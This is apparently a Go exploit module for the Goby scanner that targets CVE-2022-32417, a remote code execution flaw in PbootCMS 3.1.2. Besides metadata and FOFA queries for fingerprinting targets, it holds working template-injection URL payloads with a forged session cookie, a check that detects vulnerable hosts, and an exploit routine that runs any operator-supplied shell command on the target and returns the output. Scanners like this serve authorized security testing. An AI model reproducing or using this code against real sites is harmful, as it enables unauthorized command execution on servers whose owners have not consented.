package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "PbootCMS unction.php RCE (CVE-2022-32417)",
    "Description": "<p>PbootCMS is an open source enterprise website content management system (CMS) developed by PbootCMS personal developers using PHP language.</p><p>There is a security vulnerability in PbootCMS version 3.1.2, through which an attacker can cause remote code execution.</p>",
    "Product": "PbootCMS",
    "Homepage": "https://www.pbootcms.com/",
    "DisclosureDate": "2022-07-15",
    "Author": "abszse",
    "FofaQuery": "banner=\"Set-Cookie: pbootsystem=\" || header=\"Set-Cookie: pbootsystem=\" || title=\"PbootCMS\" || (body=\"/css/animate.css\" && body=\"/css/bootstrap.min.css\" && body=\"fa fa-phone\") || body=\"www.pbootcms.com\"",
    "GobyQuery": "banner=\"Set-Cookie: pbootsystem=\" || header=\"Set-Cookie: pbootsystem=\" || title=\"PbootCMS\" || (body=\"/css/animate.css\" && body=\"/css/bootstrap.min.css\" && body=\"fa fa-phone\") || body=\"www.pbootcms.com\"",
    "Level": "2",
    "Impact": "<p>There is a security vulnerability in PbootCMS version 3.1.2, through which an attacker can cause remote code execution.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch: <a href=\"https://www.pbootcms.com/changelog/\">https://www.pbootcms.com/changelog/</a></p>",
    "References": [
        "https://nvd.nist.gov/vuln/detail/CVE-2022-32417"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/?member/login/?suanve=}{pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))}123321suanve{/pboot:if}&backurl=;aodvc|md5sum",
                "follow_redirect": false,
                "header": {
                    "Cookie": "PbootSystem=qndt58bje3pulluvsp8g2krv4u;lg=system"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "d41d8cd98f00b204e9800998ecf8427e",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php/keyword?keyword=}{pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))}123321suanve{/pboot:if}&backurl=;aodvc|md5sum",
                "follow_redirect": false,
                "header": {
                    "Cookie": "PbootSystem=qndt58bje3pulluvsp8g2krv4u;lg=system"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "d41d8cd98f00b204e9800998ecf8427e",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php/?suanve=}{pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))}123321suanve{/pboot:if}&backurl=;aodvc|md5sum",
                "follow_redirect": false,
                "header": {
                    "Cookie": "PbootSystem=qndt58bje3pulluvsp8g2krv4u;lg=system"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "d41d8cd98f00b204e9800998ecf8427e",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php/?suanve=}{pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))}123321suanve{/pboot:if}&backurl=;aodvc|{{{cmd}}}",
                "follow_redirect": false,
                "header": {
                    "Cookie": "PbootSystem=qndt58bje3pulluvsp8g2krv4u;lg=system"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php/keyword?keyword=}{pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))}123321suanve{/pboot:if}&backurl=;aodvc|{{{cmd}}}",
                "follow_redirect": false,
                "header": {
                    "Cookie": "PbootSystem=qndt58bje3pulluvsp8g2krv4u;lg=system"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/?member/login/?suanve=}{pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))}123321suanve{/pboot:if}&backurl=;aodvc|{{{cmd}}}",
                "follow_redirect": false,
                "header": {
                    "Cookie": "PbootSystem=qndt58bje3pulluvsp8g2krv4u;lg=system"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2022-32417"
    ],
    "CNNVD": [
        "CNNVD-202207-1341"
    ],
    "CNVD": [],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "PbootCMS unction.php 远程代码执行漏洞（CVE-2022-32417）",
            "Product": "PbootCMS",
            "Description": "<p>PbootCMS是PbootCMS个人开发者的一款使用PHP语言开发的开源企业建站内容管理系统（CMS）。<br></p><p>PbootCMS 3.1.2版本中存在安全漏洞，攻击者可通过该漏洞引发代码远程执行。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://www.pbootcms.com/changelog/\">https://www.pbootcms.com/changelog/</a><br></p>",
            "Impact": "<p>PbootCMS 3.1.2版本中存在安全漏洞，攻击者可通过该漏洞引发代码远程执行。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "PbootCMS unction.php RCE (CVE-2022-32417)",
            "Product": "PbootCMS",
            "Description": "<p>PbootCMS is an open source enterprise website content management system (CMS) developed by PbootCMS personal developers using PHP language.<br></p><p>There is a security vulnerability in PbootCMS version 3.1.2, through which an attacker can cause remote code execution.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch: <a href=\"https://www.pbootcms.com/changelog/\">https://www.pbootcms.com/changelog/</a><br></p>",
            "Impact": "<p>There is a security vulnerability in PbootCMS version 3.1.2, through which an attacker can cause remote code execution.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-06-09",
    "PocId": "10755"
}`

	checkPayloadJWOKA123 := func(hostInfo *httpclient.FixUrl, cmd string) string {
		cmd = strings.ReplaceAll(cmd, " ", "+")
		uriList := []string{`/index.php/?suanve=}{pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))}123321suanve{/pboot:if}&backurl=;`, `/index.php/keyword?keyword=}{pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))}123321suanve{/pboot:if}&backurl=;`, `/?member/login/?suanve=}{pboot:if((get_lg/*suanve-*/())/**/(get_backurl/*suanve-*/()))}123321suanve{/pboot:if}&backurl=;`}
		for _, uri := range uriList {
			cfg := httpclient.NewGetRequestConfig(uri + cmd)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Cookie", "PbootSystem=qndt58bje3pulluvsp8g2krv4u;lg=system")
			resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
			if err != nil {
				continue
			}
			if resp.StatusCode == 200 && len(resp.Utf8Html) > 10 {
				regResult := regexp.MustCompile(`([\s\S]*?)<!doctype html>`).FindAllStringSubmatch(resp.Utf8Html, -1)
				if len(regResult) > 0 && len(regResult[0]) > 1 {
					return regResult[0][1]
				}
			}
		}
		return ""
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			checkStr := strings.ToLower(goutils.RandomHexString(5))
			result := checkPayloadJWOKA123(hostInfo, "echo+"+checkStr)
			if strings.Contains(result, checkStr) {
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := stepLogs.Params["cmd"].(string)
			result := checkPayloadJWOKA123(expResult.HostInfo, cmd)
			if len(result) >= 2 {
				expResult.Success = true
				expResult.Output = result
			}
			return expResult
		},
	))
}
